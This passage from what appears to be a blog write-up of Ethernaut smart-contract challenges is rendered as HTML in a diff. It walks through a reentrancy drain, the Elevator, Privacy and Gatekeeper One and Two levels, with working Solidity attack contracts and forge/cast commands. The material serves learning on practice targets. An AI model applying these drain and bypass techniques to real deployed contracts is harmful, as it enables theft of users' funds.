+    <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="n">drain</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="n">amount</span><span class="o">=</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+        <span class="n">challengeContract</span><span class="p">.</span><span class="n">donate</span><span class="p">{</span><span class="n">value</span><span class="o">:</span><span class="n">amount</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        <span class="n">challengeContract</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">drain</span><span class="p">()</span> <span class="k">private</span> <span class="p">{</span>
+        <span class="kt">uint</span> <span class="n">remainingBalance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">challengeContract</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+                                
+        <span class="k">if</span><span class="p">(</span><span class="n">remainingBalance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kt">uint</span> <span class="n">toWithdraw</span> <span class="o">=</span> <span class="p">(</span><span class="n">remainingBalance</span> <span class="o">&gt;</span> <span class="n">amount</span><span class="o">?</span> <span class="n">amount</span><span class="o">:</span><span class="n">remainingBalance</span><span class="p">);</span>
+            <span class="n">challengeContract</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">toWithdraw</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<hr />
+
+<h1 id="elevator">Elevator</h1>
+
+<p>Since <code class="language-plaintext highlighter-rouge">Elevator.sol</code> never implemented <code class="language-plaintext highlighter-rouge">isLastFloor</code> from the <code class="language-plaintext highlighter-rouge">Building</code> interface, we can create a <code class="language-plaintext highlighter-rouge">Building</code> contract that implements the function. So, when we invoke <code class="language-plaintext highlighter-rouge">goTo</code> from our <code class="language-plaintext highlighter-rouge">Building</code> contract, it will use our definition of <code class="language-plaintext highlighter-rouge">isLastFloor</code>.</p>
+<ul>
+  <li>the <code class="language-plaintext highlighter-rouge">goTo(uint)</code> function calls <code class="language-plaintext highlighter-rouge">isLastFloor</code> twice, and we need it to return <code class="language-plaintext highlighter-rouge">false</code>, then <code class="language-plaintext highlighter-rouge">true</code>. We can just store a counter variable <code class="language-plaintext highlighter-rouge">timesCalled</code></li>
+  <li><code class="language-plaintext highlighter-rouge">forge create src/AttackElevator.sol:Building --verify</code></li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">interface</span> <span class="n">IElevator</span><span class="p">{</span>
+    <span class="k">function</span> <span class="n">goTo</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_floor</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">Building</span><span class="p">{</span>    
+    <span class="kt">uint</span> <span class="n">timesCalled</span><span class="p">;</span>        
+    <span class="n">IElevator</span> <span class="k">public</span> <span class="n">elevator</span><span class="p">;</span>
+    
+    <span class="k">function</span> <span class="n">isLastFloor</span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">timesCalled</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">timesCalled</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
+            <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>    
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nb">false</span><span class="p">;}</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">elevator</span> <span class="o">=</span> <span class="n">IElevator</span><span class="p">(</span><span class="n">_victim</span><span class="p">);</span>
+        <span class="n">elevator</span><span class="p">.</span><span class="n">goTo</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<hr />
+<h1 id="privacy">Privacy</h1>
+
+<p>Each storage slot in Ethereum contracts is 32 bytes. The first bool will take the entire first slot, since the following <code class="language-plaintext highlighter-rouge">uint256</code> variable = 256 bits = 32bytes so it also occupies its own slot. Both <code class="language-plaintext highlighter-rouge">uint8</code> variables, and the following <code class="language-plaintext highlighter-rouge">uint16</code> can be packed together into one slot. We thus need to take the 6th slot, corresponding to <code class="language-plaintext highlighter-rouge">data[2]</code> which is a <code class="language-plaintext highlighter-rouge">bytes32</code> type.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cast storage &lt;challenge_addr&gt; 5</code> returns <code class="language-plaintext highlighter-rouge">bytes32 data[2]</code> = <code class="language-plaintext highlighter-rouge">0xf92a248e0a7e36a498030961667f3e29 ba5029a60fec66b27534a24225ad5241</code></li>
+  <li>big endian ordering (stored starting on left side) applies for strings and bytes, while little endian (start storing on the right) applies for bool, numbers, addresses</li>
+  <li>Hence, <code class="language-plaintext highlighter-rouge">byte16(data[2])</code> = <code class="language-plaintext highlighter-rouge">0xf92a248e0a7e36a498030961667f3e29</code> (ie. take the left-half due to big-endian order for <code class="language-plaintext highlighter-rouge">bytes32</code> type)</li>
+  <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "unlock(bytes16)" 0xf92a248e0a7e36a498030961667f3e29</code> solves the challenge</li>
+</ul>
+
+<hr />
+<h1 id="gatekeeper-one">Gatekeeper One</h1>
+
+<p>To satisfy <code class="language-plaintext highlighter-rouge">gateOne()</code>, we simply need to call <code class="language-plaintext highlighter-rouge">enter(_gateKey)</code> from a contract that we deploy.
+As for <code class="language-plaintext highlighter-rouge">gateThree</code>, we need a <code class="language-plaintext highlighter-rouge">bytes8</code> key (16 hex characters) satisfying each of the 3 require statements.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">uint32(uint64(_gateKey)) == uint16(tx.origin)</code> implies that the last 8 hex characters of the key have to equal the last 4 hex characters of <code class="language-plaintext highlighter-rouge">tx.origin</code> (a9E1 for me)
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">0x????????0000a9E1</code> works. Recall that casting down for ints follows little endian (keep rightmost characters)</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</code> implies that last 8 hex characters of the key have to equal the last 4 hex characters
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">0x????????0000a9E1</code> still works</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">uint32(uint64(_gateKey)) != uint64(_gateKey)</code> implies that the last 8 hex characters of the key cannot equal the full 16 hex characters
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">0xFFFFFFFF0000a9E1</code> as the final <code class="language-plaintext highlighter-rouge">_gateKey</code> satisfies this, since <code class="language-plaintext highlighter-rouge">0xFFFFFFFF0000a9E1 != 0x0000a9E1</code></li>
+    </ul>
+  </li>
+</ul>
+
+<p>As shown below, you can use <code class="language-plaintext highlighter-rouge">console.log</code> as done in my <a href="https://github.com/axucar/ethernaut-forge/blob/main/test_archive/GatekeeperOne.t.sol#L19-L22">test script</a> to verify that the key works. See <a href="http://axucar.ca/2022/09/09/foundryexplain/#test-locally-using-foundry">previous blog</a> on how to run Foundry tests locally for debugging purposes by forking the live testnet.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// test/GatekeeperOne.t.sol
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="s">"forge-std/Test.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"src/AttackGatekeeperOne.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">ContractTest</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+    <span class="n">AttackGatekeeperOne</span> <span class="n">gkp</span><span class="p">;</span>
+    <span class="k">function</span> <span class="n">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">gkp</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AttackGatekeeperOne</span><span class="p">(</span><span class="mh">0x590aAf34f517B1ADc569bfB48420227FE0D0ceD8</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">testGatekeeper</span><span class="p">()</span> <span class="k">public</span><span class="p">{</span>
+        <span class="kt">bytes8</span> <span class="n">_key</span> <span class="o">=</span> <span class="mh">0xffffffff0000a9E1</span><span class="p">;</span> 
+        <span class="n">vm</span><span class="p">.</span><span class="n">startPrank</span><span class="p">(</span><span class="mh">0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1</span><span class="p">,</span><span class="mh">0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1</span><span class="p">);</span>
+
+        <span class="n">console</span><span class="p">.</span><span class="n">logBytes8</span><span class="p">(</span><span class="n">_key</span><span class="p">);</span>
+        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"uint16(uint64(_key)): %s"</span><span class="p">,</span> <span class="kt">uint16</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">))</span> <span class="p">);</span>
+        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"uint32(uint64(_key)): %s"</span><span class="p">,</span> <span class="kt">uint32</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">))</span> <span class="p">);</span>
+        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"uint64(_key): %s"</span><span class="p">,</span> <span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">));</span>
+        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"uint16(tx.origin): %s"</span><span class="p">,</span> <span class="kt">uint16</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="mh">0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1</span><span class="p">)));</span>
+
+        <span class="n">gkp</span><span class="p">.</span><span class="n">attack</span><span class="p">(</span><span class="n">_key</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">vm</span><span class="p">.</span><span class="n">stopPrank</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Logs:
+0xffffffff0000a9e1
+uint16(uint64(_key)): 43489
+uint32(uint64(_key)): 43489
+uint64(_key): 18446744069414627809
+uint16(tx.origin): 43489
+</code></pre></div></div>
+
+<p>Finally, we need to satisfy <code class="language-plaintext highlighter-rouge">gateTwo</code>, in my opinion the most challenging of the 3 modifiers. 
+Commands to solve the challenge:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">forge create src/AttackGatekeeperOneExact.sol:AttackGatekeeperOneExact --verify --constructor-args &lt;challenge_contract&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">cast send &lt;attacker_contract&gt; "attack(bytes8,uint256)" 0xffffffff0000a9E1 82164 --gas-limit 600000</code></li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">AttackGatekeeperOneExact</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">victim</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">victim</span> <span class="o">=</span> <span class="n">_victim</span><span class="p">;</span>
+    <span class="p">}</span>   
+
+    <span class="k">function</span> <span class="n">attack</span><span class="p">(</span><span class="kt">bytes8</span> <span class="n">_key</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_gasLevel</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+        <span class="c1">//0xffffffff0000a9E1
+</span>        <span class="nb">require</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">))</span> <span class="o">==</span> <span class="kt">uint16</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">)),</span> <span class="s">"GatekeeperOne: invalid gateThree part one"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">))</span> <span class="o">!=</span> <span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">),</span> <span class="s">"GatekeeperOne: invalid gateThree part two"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_key</span><span class="p">))</span> <span class="o">==</span> <span class="kt">uint16</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span><span class="p">)),</span> <span class="s">"GatekeeperOne: invalid gateThree part three"</span><span class="p">);</span>
+
+        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"enter(bytes8)"</span><span class="p">,</span> <span class="n">_key</span><span class="p">);</span>
+        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">victim</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">gas</span><span class="o">:</span> <span class="n">_gasLevel</span> <span class="o">+</span> <span class="mi">8191</span><span class="o">*</span><span class="mi">10</span><span class="p">}(</span><span class="n">payload</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"failed"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">success</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+<p><strong>Question</strong>: how did we know the <code class="language-plaintext highlighter-rouge">_gasLevel</code> parameter in the attack function should be 82164?
+The answer is that we fork the live testnet to log the correct gasLevel in a for-loop. Forking a live testnet means we don’t need to do any setup to simulate the actual gas usage, as all the relevant contracts (ie. the challenge contract) are deployed. Instead of running the for-loop in live testnet (as I’ve seen some tutorials do, wasting testnet ETH and also taking more time to test), we can debug gas using foundry’s <code class="language-plaintext highlighter-rouge">forge test -vvvv --rpc-url $ETH_RPC_URL</code>. Replace the line <code class="language-plaintext highlighter-rouge">(bool success,) = victim.call{gas: _gasLevel + 8191*10}(payload);</code> with the for loop clause below:</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//src/AttackGatekeeperOne.sol (with loop for testing)
+</span><span class="k">import</span> <span class="s">"forge-std/Test.sol"</span><span class="p">;</span>
+<span class="p">...</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">300</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="p">(</span><span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">victim</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">gas</span><span class="o">:</span> <span class="n">i</span> <span class="o">+</span> <span class="n">_gasLevel</span> <span class="o">+</span> <span class="mi">8191</span><span class="o">*</span><span class="mi">10</span><span class="p">}(</span><span class="n">payload</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">success</span><span class="p">){</span>
+        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">_gasLevel</span> <span class="o">+</span> <span class="mi">8191</span><span class="o">*</span><span class="mi">10</span><span class="p">);</span> 
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h1 id="gatekeeper-two">Gatekeeper Two</h1>
+
+<p>As with Gatekeeper One, <code class="language-plaintext highlighter-rouge">gateOne()</code> is trivial (call <code class="language-plaintext highlighter-rouge">enter</code> using a contract). 
+For <code class="language-plaintext highlighter-rouge">gateTwo()</code>, we see that <code class="language-plaintext highlighter-rouge">assembly { x := extcodesize(caller()) }</code> and <code class="language-plaintext highlighter-rouge">require(x==0)</code>, so somehow the size of the code of our attack contract must be 0.</p>
+<ul>
+  <li>The workaround is to call all the functions within the constructor (since code size is still 0 while still inside the construction clause).</li>
+</ul>
+
+<p>Finally, for <code class="language-plaintext highlighter-rouge">gateThree</code>, we have <code class="language-plaintext highlighter-rouge">require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1)</code> which can be rewritten as <code class="language-plaintext highlighter-rouge">require(a ^ b == c)</code>, which we prove is equivalent to <code class="language-plaintext highlighter-rouge">require(b == a ^ c)</code> below.</p>
+<ul>
+  <li>
+    <div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="o">==</span> <span class="n">c</span>
+<span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="o">^</span> <span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="n">c</span> <span class="o">^</span> <span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="n">c</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">^</span> <span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="n">b</span><span class="p">)</span> <span class="o">^</span> <span class="n">c</span> <span class="o">==</span> <span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">b</span>
+<span class="n">a</span> <span class="o">^</span> <span class="mi">0</span> <span class="o">^</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">^</span> <span class="n">b</span>
+<span class="n">a</span> <span class="o">^</span> <span class="n">c</span> <span class="o">==</span> <span class="n">b</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Since <code class="language-plaintext highlighter-rouge">solidity ^0.8.0</code>, there is underflow and overflow checking, so <code class="language-plaintext highlighter-rouge">uint(64)-1</code> has to be written as <code class="language-plaintext highlighter-rouge">type(uint64).max</code></li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="s">"forge-std/Test.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">AttackGatekeeperTwo</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">victim</span><span class="p">;</span>
+    
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">victim</span> <span class="o">=</span> <span class="n">_victim</span><span class="p">;</span>
+        <span class="kt">bytes8</span> <span class="n">_key</span> <span class="o">=</span> <span class="kt">bytes8</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="kt">bytes8</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)))))</span> <span class="o">^</span> <span class="p">(</span><span class="k">type</span><span class="p">(</span><span class="kt">uint64</span><span class="p">).</span><span class="n">max</span><span class="p">));</span> 
+        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"enter(bytes8)"</span><span class="p">,</span> <span class="n">_key</span><span class="p">);</span>
+        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">victim</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
+
+        <span class="kt">uint</span> <span class="n">x</span><span class="p">;</span>
+        <span class="k">assembly</span> <span class="p">{</span> <span class="n">x</span> <span class="o">:=</span> <span class="n">extcodesize</span><span class="p">(</span><span class="kt">address</span><span class="p">())</span> <span class="p">}</span>
+        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"extcodesize at constructor is: %s"</span><span class="p">,</span><span class="n">x</span><span class="p">);</span>
+
+        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"failed"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+  </div>
+
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy;  - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://axucar.ca/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
